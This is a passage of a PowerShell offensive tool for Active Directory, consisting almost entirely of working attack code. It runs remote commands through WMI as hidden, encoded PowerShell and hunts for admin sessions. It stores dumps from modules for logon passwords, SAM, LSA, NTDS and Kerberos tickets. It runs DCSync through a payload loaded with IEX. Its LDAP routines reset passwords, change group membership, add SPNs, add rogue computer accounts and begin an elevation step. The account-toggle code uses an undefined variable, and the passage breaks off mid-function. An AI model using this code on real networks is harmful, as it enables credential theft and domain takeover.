                elseif ($Command -eq "") { return "Successful Connection PME" }

                function Invoke-Class {
                    param (
                        [string]$ComputerName
                    )

                    if ($LocalAuth) { $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2" -Credential $cred }
                    else { $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2" }

                    if ($classCheck -eq $null) {
                        if ($LocalAuth) {
                            $scope = New-Object System.Management.ManagementScope("\\$ComputerName\root\cimv2", (New-Object System.Management.ConnectionOptions -Property @{ Username = "$Computername\$Username"; Password = $Password }))
                            $scope.Connect()
                            $newClass = New-Object System.Management.ManagementClass($scope, [System.Management.ManagementPath]::DefaultPath, $null)
                        }
                        else { $newClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2", [string]::Empty, $null) }

                        $newClass["__CLASS"] = "$Class"
                        $newClass.Qualifiers.Add("Static", $true)
                        $newClass.Properties.Add("InstanceID", [System.Management.CimType]::String, $false)
                        $newClass.Properties["InstanceID"].Qualifiers.Add("Key", $true)
                        $newClass.Properties.Add("CommandOutput", [System.Management.CimType]::String, $false)
                        $newClass.Properties.Add("CommandToRun", [System.Management.CimType]::String, $false)
                        $newClass.Put() | Out-Null
                    }

                    if ($LocalAuth) { $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName -Credential $cred }
                    else { $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName }

                    $wmiInstance.GetType() | Out-Null
                    $wmiInstance.CommandToRun = "$Command"
                    $wmiInstance.Put() | Out-Null
                    $InstanceID = $wmiInstance.InstanceID
                    $wmiInstance.Dispose()
                    return $InstanceID
                }

                # Function to retrieve script output
                function GetScriptOutput {
                    param (
                        [string]$ComputerName,
                        [string]$InstanceID
                    )
                    try {
                        if ($LocalAuth) { $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "InstanceID = '$InstanceID'" -Credential $cred }
                        else { $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "InstanceID = '$InstanceID'" }
            
                        $encodedResult = $wmiInstance.CommandOutput
                        $wmiInstance.Dispose()
                        $resultBytes = [Convert]::FromBase64String($encodedResult)
                        $result = [System.Text.Encoding]::UTF8.GetString($resultBytes)
                        return $result
                    }
                    catch {
                        return $_.Exception.Message
                    }
                    finally {
                        if ($wmiInstance) {
                            $wmiInstance.Dispose()
                        }
                    }
                }

                # Function to execute a command remotely
                function Invoke-Execution {
                    param (
                        [string]$ComputerName,
                        [string]$Command
                    )

                    $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command      

                    if ($LocalAuth) { $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine -Credential $cred }
                    else { $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine }

                    if ($process.ReturnValue -eq 0) {
                        $started = Get-Date
                        Do {
                            if ($started.AddMinutes(2) -lt (Get-Date)) {
                                Write-Host "PID: $($process.ProcessId) - Response took too long."
                                break
                            }
    
                            $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"
    
                            Start-Sleep -Seconds 1
                        } While ($watcher -ne $null)
                        $scriptOutput = GetScriptOutput -ComputerName $ComputerName -InstanceID $scriptInstanceID
                        return $scriptOutput
                    }
                }

                $scriptInstanceID = Invoke-Class -ComputerName $ComputerName
                if ($scriptInstanceID -eq $null) { return "Error Creating Class" }

                $script = @"
`$commandToRun = (Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`").CommandToRun
`$result = Invoke-Command -ScriptBlock { `$commandToRun | IEX } | Out-String
`$result = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$result))
Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null
"@

                $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($script))
                $result = Invoke-Execution -ComputerName $ComputerName -Command $encodedCommand

                try {
                    Start-Sleep -Seconds 1

                    if ($LocalAuth) { Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName -Credential $cred | Out-Null }
                    else { Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName | Out-Null }

                    $Cleanup = "Success"
                }
                Catch {}
                return $result
            }

            function AdminCount {
                param (
                    [string]$UserName,
                    [System.DirectoryServices.DirectorySearcher]$Searcher
                )

                $Searcher.Filter = "(sAMAccountName=$UserName)"
                $Searcher.PropertiesToLoad.Clear()
                $Searcher.PropertiesToLoad.Add("adminCount") > $null

                $user = $Searcher.FindOne()

                if ($user -ne $null) {
                    $adminCount = $user.Properties["adminCount"]
                    if ($adminCount -eq 1) {
                        return $true
                    }
                }
                return $false
            }

            function SessionHunter {
                param($ComputerName, $Command)

                $userSIDs = @()
                $domainCache = @{}
                $Searcher = New-Object System.DirectoryServices.DirectorySearcher
                $adminPresent = $false

                function GetDomainFQDNFromSID {
                    param($sid)
                    $objSID = New-Object System.Security.Principal.SecurityIdentifier($sid)
                    $objDomain = $objSID.Translate([System.Security.Principal.NTAccount]).Value.Split('\')[0]
            
                    if (-not $domainCache[$objDomain]) {
                        try {
                            $FQDN = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $objDomain))).Name
                            $domainCache[$objDomain] = $FQDN
                        }
                        catch {
                            return $objDomain
                        }
                    }
                    return $domainCache[$objDomain]
                }

                try {
                    $remoteRegistry = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', $ComputerName)
                }
                catch {
                    return
                }

                $userKeys = $remoteRegistry.GetSubKeyNames()

                foreach ($key in $userKeys) {
                    if ($key -match '^[Ss]-\d-\d+-(\d+-){1,14}\d+$') {
                        $userSIDs += $key
                    }
                }

                $remoteRegistry.Close()

                foreach ($sid in $userSIDs) {
                    try {
                        $user = New-Object System.Security.Principal.SecurityIdentifier($sid)
                        $userTranslation = $user.Translate([System.Security.Principal.NTAccount])
                        $username = $userTranslation.Value.Split('\')[1]
                
                        if (AdminCount -UserName $username -Searcher $Searcher) {
                            $adminPresent = $true
                            break
                        }
                    }
                    catch {}
                }

                if ($adminPresent) {
                    if ($Command -eq "") {
                        # We can just return as OSinfo was checked earlier in script
                        return "Successful connection PME"
            
                    }
                    elseif ($Command -ne "") {

                        return WMI $ComputerName -command $Command
            
                    }
                }

            }

            SessionHunter -ComputerName $computerName -command $Command

        }

        # Create and invoke runspaces for each computer
        foreach ($computer in [array]$Computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = "$Computer"
                $OS = "OS:PLACEHOLDER"
            }
    
            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }

        
        [int]$Global:SuccessCount = 0
        
        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {

                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                    $hasDisplayedResult = $false

                    try {
                        $result = $result.Trim()
                    }
                    catch {}

                    if ($result -eq "Unable to connect") {
                        continue
                    }
                    elseif ($result -eq "Access Denied") {
                        if ($successOnly) {
                            continue
                        }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Red" `
                            -statusSymbol "[-] " `
                            -statusText "ACCESS DENIED" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                    elseif ($result -eq "Unspecified Error") {
                        if ($successOnly) {
                            continue
                        }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Red" `
                            -statusSymbol "[-] " `
                            -statusText "ERROR" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                    elseif ($result -eq "Timed Out") {
                        if ($successOnly) {
                            continue
                        }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "TIMED OUT" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                    elseif ($result -eq "NotDomainController" -and ($Module -eq "NTDS" -or $Module -eq "lsa-trust")) {
                        if ($successOnly) {
                            continue
                        }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "NON-DOMAIN CONTROLLER" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                    elseif ($result -like "*Object reference not set to an instance of an object.*" -and $Module -eq "SCCM") {
                        if ($successOnly) {
                            continue
                        }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "NOT SCCM CLIENT" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                    elseif ($result -eq "No Results" -and $Module -eq "WinSCP") {
                        if ($successOnly) {
                            continue
                        }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "NO RESULTS" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }

                    elseif ($result -eq "RunAsPPL Disabled") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "RunAsPPL Disabled" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }

                    elseif ($result -eq "RunAsPPL Enabled") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Red" `
                            -statusSymbol "[-] " `
                            -statusText "RunAsPPL Disabled" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }

                    elseif ($result -eq "Successful Connection PME") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "SUCCESS" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -ComputerOwned
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -UserName $Username `
                            -AdminToProperty
                        continue
                    }
                    elseif ($result -match "[a-zA-Z0-9]") {
                        if ($result -eq "No Results") {
                            if ($successOnly) {
                                continue
                            }
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                                -OS $($runspace.OS) `
                                -statusColor "Yellow" `
                                -statusSymbol "[*] " `
                                -statusText "NO RESULTS" `
                                -NameLength $NameLength `
                                -OSLength $OSLength
                            continue
                        }
                        else {
                            $Global:SuccessCount++
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                                -OS $($runspace.OS) `
                                -statusColor "Green" `
                                -statusSymbol "[+] " `
                                -statusText "SUCCESS" `
                                -NameLength $NameLength `
                                -OSLength $OSLength
                            Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                                -Domain $Domain `
                                -ComputerOwned
                            Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                                -Domain $Domain `
                                -UserName $Username `
                                -AdminToProperty

                            $filePath = switch ($Module) {
                                "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                                "eKeys" { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                                "FileZilla" { "$FileZilla\$($runspace.ComputerName)-FileZilla.txt" }
                                "Files" { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                                "KerbDump" { "$Tickets\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                                "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                                "LSA" { "$LSADump\$($runspace.ComputerName)-LSA.txt" }
                                "LSA-Trust" { "$LSATrust\$($runspace.ComputerName)-Trust.txt" }
                                "MDF" { "$MDF\$($runspace.ComputerName)-MDF.txt" }
                                "NTDS" { "$DCSyncFullDump\$($runspace.ComputerName)-NTDS.txt" }
                                "NTLM" { "$NTLM\$($runspace.ComputerName)-NTLM.txt" }
                                "Notepad" { "$Notepad\$($runspace.ComputerName)-Notepad.txt" }
                                "SAM" { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                                "SCCM" { "$SCCM\$($runspace.ComputerName)-SCCM.txt" }
                                "SessionExec" { "$SessionExec\$($runspace.ComputerName)-SessionExec.txt" }
                                "SessionRelay" { "$SessionRelay\$($runspace.ComputerName)-SessionRelay.txt" }
                                "SSH" { "$SSH\$($runspace.ComputerName)-SSH.txt" }
                                "TGTDeleg" { "$TGTDeleg\$($runspace.ComputerName)-TGTDeleg.txt" }
                                "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                                "VNC" { "$VNCDump\$($runspace.ComputerName)-VNC.txt" }
                                "Wifi" { "$Wifi\$($runspace.ComputerName)-Wifi.txt" }
                                "WinSCP" { "$WinSCP\$($runspace.ComputerName)-WinSCP.txt" }
                                default { $null }
                            }

                            if ($filePath) {
                                $result | Out-File -FilePath $filePath -Encoding "ASCII"

                                if ($ShowOutput) {
                                    $result | Write-Output
                                    Write-Output ""
                                    $hasDisplayedResult = $true
                                }
                            }

                            # Handle the default case.
                            if (-not $Module -and -not $hasDisplayedResult) {
                                $result | Write-Output
                                Write-Output ""
                                $hasDisplayedResult = $true
                            }
                        }
                    }
                    elseif ($result -notmatch "[a-zA-Z0-9]") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "SUCCESS" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -ComputerOwned
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -UserName $Username `
                            -AdminToProperty
                        continue
                    }

                    # Dispose of runspace and close handle
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }
            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })

        
        $runspacePool.Close()
        $runspacePool.Dispose()

    }

    ################################################################################################################
    ################################################ Function: DCSync ##############################################
    ################################################################################################################
    Function Method-DCSync {

        Write-Output ""
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param (
                $computerName,
                $Command,
                $Timeout,
                $Option,
                $Global:Pandemonium,
                $Domain
            )

            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($ComputerName, 88, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout)

            if ($wait) {
                try {
                    $tcpClient.EndConnect($asyncResult)
                    $connected = $true
                }
                catch {
                    $connected = $false
                }
            }
            else {
                $connected = $false
            }

            if (!$connected) {
                $tcpClient.Close()
                return "Unable to connect"
            }
        
            if ($Option -like "*dcsync:*") {
                $SyncUser = $Option.Split(':')[1]
            
                if (-not $SyncUser) { return "Failed to parse option" }

                $Global:Pandemonium | IEX | Out-Null
                $DomainName = $Computername.Substring($Computername.IndexOf(".") + 1)
                $Result = Invoke-Pandemonium -Command "DCSync" -DCSyncUser $SyncUser -Domain $DomainName -DC $computerName
                
        
            }
            else {
            
                $Global:Pandemonium | IEX | Out-Null
                $DomainName = $Computername.Substring($Computername.IndexOf(".") + 1)
                $result = Invoke-NTDS -Domain $DomainName -dc $computerName -SkipCheck
            }
            return $result
        }

        foreach ($computer in [array]$Computers) {

            $ComputerName = $computer.Properties["dnshostname"][0]
            $OS = $computer.Properties["operatingSystem"][0]

            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout).AddArgument($Option).AddArgument($Global:Pandemonium).AddArgument($Domain)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }


        [int]$Global:SuccessCount = 0

        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)

                    try {
                        $result = $result.Trim()
                    }
                    catch { }

                    if ($result -eq "Unable to connect") {
                        continue
                    }

                    if ($result -like "*Failed to parse option*") {
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[-] " `
                            -statusText "Failed to parse ""-option"" value" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                    else {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "SUCCESS" `
                            -NameLength $NameLength `
                            -OSLength $OSLength

                        if ($ShowOutput) {
                            Write-Output ""
                            $result | Write-Output
                        }

                        if ($Option -like "dcsync:*") {
                            $SyncUser = $Option.Split(':')[1]
                            $SyncUser = $SyncUser -replace ('\\', '_')
                            $result | Out-File -FilePath "$DCSyncUser\$SyncUser.$($Domain.ToLower()).txt" -Encoding "ASCII" -Force
                        }
                        else {
                            $result | Out-File -FilePath "$DCSyncFullDump\$($runspace.ComputerName).txt" -Encoding "ASCII" -Force
                        }

                        continue
                    }

                    [void]$runspace.Runspace.Dispose()
                    [void]$runspace.Handle.AsyncWaitHandle.Close()
                }
            }
            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })

        $runspacePool.Close()
        $runspacePool.Dispose()
    }

    ################################################################################################################
    ################################################ Function: LDAP ################################################
    ################################################################################################################
    Function Method-LDAP {
        param ($ComputerName)
        
        Write-host
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param ($computerName, $Command, $Username, $Password, $LocalAuth, $Timeout, $Module, $TargetDN, $GroupDN, $SID, $LDAPS, $Timeroast, $ShowOutput)

            function Get-RandomString { -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) }

            $tcpClient = New-Object System.Net.Sockets.TcpClient

            if ($LDAPS) { $asyncResult = $tcpClient.BeginConnect($ComputerName, 636, $null, $null) }
            else { $asyncResult = $tcpClient.BeginConnect($ComputerName, 389, $null, $null) }
            
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout)

            if ($wait) {
                try {
                    $tcpClient.EndConnect($asyncResult)
                    $connected = $true
                }
                catch {
                    $connected = $false
                }
            }
            else {
                $connected = $false
            }

            $tcpClient.Close()
            
            if (!$connected) { return "Unable to connect" }

            try {
                try { Add-Type -AssemblyName System.DirectoryServices.Protocols -ErrorAction SilentlyContinue } catch {}

                try {
                    
                    if ($LDAPS) {

                        $LdapIdentifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($ComputerName, 636)
                        $LdapConnection = New-Object System.DirectoryServices.Protocols.LdapConnection($LdapIdentifier)
                        $LdapConnection.SessionOptions.SecureSocketLayer = $true

                    }

                    else {

                        $LdapIdentifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($ComputerName, 389)
                        $LdapConnection = New-Object System.DirectoryServices.Protocols.LdapConnection($LdapIdentifier)
                        $LdapConnection.SessionOptions.Sealing = $true
                        $LdapConnection.SessionOptions.Signing = $true

                    }
                    

                    # Bind to test the connection, might have to drop this when authenticating with a certificate?
                    $LdapConnection.Bind()

                }
                
                catch { return "LDAP Failure: $_" }

                if ($Module -eq "whoami") {
                    $WhoamiRequest = New-Object System.DirectoryServices.Protocols.ExtendedRequest("1.3.6.1.4.1.4203.1.11.3")
                    $Response = $LdapConnection.SendRequest($WhoamiRequest)

                    if ($Response.ResponseValue) {
                        $WhoamiResult = [System.Text.Encoding]::UTF8.GetString($Response.ResponseValue)
                        $Identity = $WhoamiResult.Split(':')[1].Trim()
                        $Result = "Authenticated as $Identity"
                        return $Result
                    }
                }

                if ($Module -eq "MAQ") {

                    $Searcher = [System.DirectoryServices.DirectorySearcher]::new()
                    $SearchBase = $Searcher.SearchRoot.Path.Replace("LDAP://", "")
                    $searchRequest = New-Object System.DirectoryServices.Protocols.SearchRequest($SearchBase, "(objectClass=domainDNS)", [System.DirectoryServices.Protocols.SearchScope]::Base, @("ms-DS-MachineAccountQuota"))
        
                    $searchResponse = $LdapConnection.SendRequest($searchRequest)

                    if ($searchResponse.Entries.Count -gt 0) {
                        $entry = $searchResponse.Entries[0]
                        $maq = $entry.Attributes["ms-DS-MachineAccountQuota"][0]
                        return "`nMachine Account Quota: $maq`n"
                
                    }
            
                    else { return "LDAP_MAQ: No domainDNS object found." }
                }

                elseif ($Module -eq "AddSPN") {
                
                    $Value = Get-RandomString
                    $NewSPN = "cifs/$Value.domain.com"
                    $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($TargetDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add, "servicePrincipalName", $NewSPN)
                    $LdapConnection.SendRequest($ModifyRequest) > $null
                    return "[*] Successfully set SPN ""cifs/$value.domain.com"" for $TargetDN"

                }

                elseif ($Module -eq "RemoveSPN") {

                    $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($TargetDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete, "servicePrincipalName")
                    $LdapConnection.SendRequest($ModifyRequest) > $null
                    return "[*] Successfully Unset SPNs for $TargetDN"
                }

                elseif ($Module -eq "AddToGroup") {

                    $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($GroupDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add, "member", $TargetDN)
                    $LdapConnection.SendRequest($ModifyRequest) > $null
                    return "[*] Successfully added $TargetDN to $GroupDN"
                }
            
                elseif ($Module -eq "RemoveFromGroup") {

                    $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($GroupDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete, "member", $TargetDN)
                    $LdapConnection.SendRequest($ModifyRequest) > $null
                    return "[*] Successfully removed $TargetDN from $GroupDN"
            
                }

                elseif ($Module -eq "ToggleAccount") {

                    $Searcher = [System.DirectoryServices.DirectorySearcher]::new()
                    $SearchBase = $Searcher.SearchRoot.Path.Replace("LDAP://", "")
                
                    $SearchRequest = [System.DirectoryServices.Protocols.SearchRequest]::new($TargetDN, "(|(objectClass=user)(objectClass=computer))", [System.DirectoryServices.Protocols.SearchScope]::Subtree, "userAccountControl")
                    $SearchResponse = $LdapConnection.SendRequest($SearchRequest)
        
                    if ($SearchResponse.Entries.Count -gt 0) {
                        $SearchResultEntry = $SearchResponse.Entries[0]
                        $UserStatus = $SearchResultEntry.Attributes["userAccountControl"][0]
        
                        [int]$UserAccountControl = [int]($SearchResultEntry.Attributes["userAccountControl"][0].ToString())
                        [int]$AccountDisable = 0x0002;
        
                        # Check if account is disabled and toggle status
                        if (($UserAccountControl -band $AccountDisable) -gt 0) {
        
                            # Currently disabled - enable it (bitwise AND with NOT flag)
                            $UserAccountControl = $UserAccountControl -band (-bnot $AccountDisable)
        
                            $UAC = $CurrentUAC -band (-bnot 0x0002)
                            $UAC = $UAC.ToString()
        
                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($TargetDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, "userAccountControl", $UAC)
                            $LdapConnection.SendRequest($ModifyRequest) > $null
        
                            return "[*] Enabled Account $TargetDN"
                        }
                    
                        else {
        
                            # Currently enabled - disable it (bitwise OR with flag)
                            $UserAccountControl = $UserAccountControl -bor $AccountDisable
        
                            $UAC = $CurrentUAC -bxor 0x0002
                            $UAC = $UAC.ToString()
        
                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($TargetDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, "userAccountControl", $UAC)
                            $LdapConnection.SendRequest($ModifyRequest) > $null
        
                            return "[*] Disabled Account $TargetDN"
                        }
                    }
                
                    else { throw "DistinguishedName $TargetDN not found" }
                }

                elseif ($Module -eq "ResetPassword") {
                
                    $NewPassword = Get-RandomString { -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) }
                    $NewPasswordBytes = [System.Text.Encoding]::Unicode.GetBytes('"' + $NewPassword + '"')           
                    $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($TargetDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, "unicodePwd", $NewPasswordBytes)
                    $LdapConnection.SendRequest($ModifyRequest) > $null
                
                    return "[*] Successfully reset ""$TargetDN"" password to $NewPassword"

                }

                elseif ($Module -eq "AddComputer") {
                
                    function Get-RandomComputerName { -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 4 | ForEach-Object { [char]$_ }) }

                    $PartialComputerName = Get-RandomComputerName
                    $ComputerName = "Evil_$PartialComputerName"

                    $ComputerPassword = Get-RandomString
        
                    $Password = [System.Text.Encoding]::Unicode.GetBytes('"' + $ComputerPassword + '"')
                    $UnicodePwd = [byte[]]$Password
        
                    $Searcher = [System.DirectoryServices.DirectorySearcher]::new()
                    $SearchBase = $Searcher.SearchRoot.Path.Replace("LDAP://", "")
                    $Domain = ($SearchBase -split ',' -replace '^DC=', '' -join '.')
                    $ComputerHostname = $ComputerName.TrimEnd('$')
                    [string]$ComputerDN = "CN=$ComputerHostname,CN=Computers,$SearchBase"
        
                    $Spns = @("HOST/$ComputerHostname", "HOST/$ComputerHostname.$Domain", "RestrictedKrbHost/$ComputerHostname", "RestrictedKrbHost/$ComputerHostname.$Domain")
        
                    $AddRequest = New-Object -TypeName System.DirectoryServices.Protocols.AddRequest
                    $AddRequest.DistinguishedName = $ComputerDN        
                    $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "objectClass", "Computer")) > $null
                    $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "SamAccountName", "$ComputerHostname$")) > $null
                    $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "userAccountControl", "4096")) > $null  # Normal computer account
                    $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "DnsHostName", "$ComputerHostname.$Domain")) > $null
                    $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "ServicePrincipalName", $Spns)) > $null
                    $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "unicodePwd", $UnicodePwd)) > $null
        
                    $LdapConnection.SendRequest($AddRequest) > $null
        
                    return "[*] Added Computer to $Domain! `n`n[*] Name     : $ComputerName `n[*] Pass     : $ComputerPassword `n[*] DN       : $ComputerDN"
        
                    $ComputerResults = New-Object PSObject
                    $ComputerResults | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $ComputerName
                    $ComputerResults | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $ComputerPassword
                    $ComputerResults | Add-Member -MemberType "NoteProperty" -Name "DN" -Value $ComputerDN
                    $ComputerResults | FT -AutoSize
            

                }

                elseif ($Module -eq "RemoveComputer") {
       
                    # This should ideally validate we are actually removing a computer object
                    $DeleteRequest = New-Object System.DirectoryServices.Protocols.DeleteRequest($TargetDN)
                    $LdapConnection.SendRequest($DeleteRequest) > $null
        
                    return "[*] Successfully removed ""$TargetDN"" from the domain."

                }

                elseif ($Module -eq "Elevate") {
            
                    try {
                
                        $ObjectToElevate = $TargetDN
                
                        $Result = ""
                        $Result += "[*] Retrieving SID of user $UserToElevate`n"
                
                        $SearchRequest = New-Object System.DirectoryServices.Protocols.SearchRequest($ObjectToElevate, "(objectClass=*)", [System.DirectoryServices.Protocols.SearchScope]::Base, "objectSid")
            	
                        try {
                    
                            $SearchResponse = $LdapConnection.SendRequest($SearchRequest)
            		
                            if ($SearchResponse.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) { throw "Failed to retrieve user SID: $($userResponse.ResultCode)" }
                            $UserEntry = $SearchResponse.Entries[0]
